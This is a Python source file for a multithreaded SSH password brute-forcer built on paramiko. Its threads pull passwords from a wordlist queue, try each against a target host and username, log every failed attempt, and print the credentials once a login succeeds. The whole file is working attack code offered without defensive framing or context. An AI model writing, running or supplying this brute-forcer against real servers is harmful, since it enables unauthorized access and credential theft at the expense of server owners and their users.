import paramiko
import threading
import queue


class SSHTarget:
    def __init__(self, host, port, login, wordlist, queue_size):
        self.host = host
        self.port = port
        self.login = login
        self.wordlist = wordlist
        self.passwords = queue.Queue(queue_size)

    def queue_empty(self):
        return self.passwords.empty()

    def queue_full(self):
        return self.passwords.full()

    def queue_fill(self, file):
        while not self.queue_full():
            password = file.readline().rstrip()
            if len(password) == 0:
                return False
            else:
                self.passwords.put(password)
        return True


class SSHAttacker(threading.Thread):
    finish = False
    password = ""
    success = False

    def __init__(self, target: SSHTarget):
        self.target = target
        self.tries = 0
        threading.Thread.__init__(self)

    def get_password(self):
        try:
            password = self.target.passwords.get(block=False)
            return password
        except queue.Empty:
            return None

    def run(self):
        while SSHAttacker.finish is False:
            password = self.get_password()
            if password is None:
                continue

            try:
                sshclient = paramiko.SSHClient()
                sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                sshclient.connect(
                    hostname=self.target.host,
                    port=self.target.port,
                    username=self.target.login,
                    timeout=3,
                    password=password,
                    allow_agent=False,
                    look_for_keys=False
                )
            except paramiko.AuthenticationException:
                self.tries += 1
                print("[%s] Failed attempt against %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))

            except paramiko.SSHException:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
                self.target.passwords.put(password)

            except Exception:
                print("[%s] Unknown exception while connecting to %s" %
                      (self.name, self.target.host))
                self.target.passwords.put(password)

            else:
                self.tries += 1
                SSHAttacker.finish = True
                SSHAttacker.password = password
                SSHAttacker.success = True
                print("[%s] Found credentials for %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))

            finally:
                sshclient.close()
